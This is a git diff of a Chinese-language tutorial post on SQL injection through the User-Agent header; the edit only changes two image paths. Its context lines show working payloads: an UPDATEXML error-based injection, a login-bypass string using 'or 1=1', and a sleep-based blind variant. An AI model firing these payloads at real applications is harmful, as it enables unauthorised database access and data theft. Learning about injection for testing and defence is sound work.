@@ -152,7 +152,7 @@ INSERT INTO uagent (`uagent`,`username`) VALUES ('mozilla' , UPDATEXML(1,CONCAT(
 -- 报错信息 1105 - XPATH syntax error: '~zkaq~', Time: 0.002000s
 ```
 
-![updatexml-error-based-mock.png](/images/2020/12/12/updatexml-error-based-mock.png)
+![updatexml-error-based-mock.png](/images/post/2020/12/12/updatexml-error-based-mock.png)
 
 
 #### 利用
@@ -180,7 +180,7 @@ Connection: close
     # username=\&password= or 1=1 ;  -- gg
 ```
 
-![ua-inject-success.png](/images/2020/12/12/ua-inject-success.png)
+![ua-inject-success.png](/images/post/2020/12/12/ua-inject-success.png)
 
 1. UPDATEXML() 仅支持常量。 `Only constant XPATH queries are supported`, 因此简单的时间盲注就不可用了。  
     `UPDATEXML(1,CONCAT(0x7e,   (select sleep(10))     ,0x7e),1))`
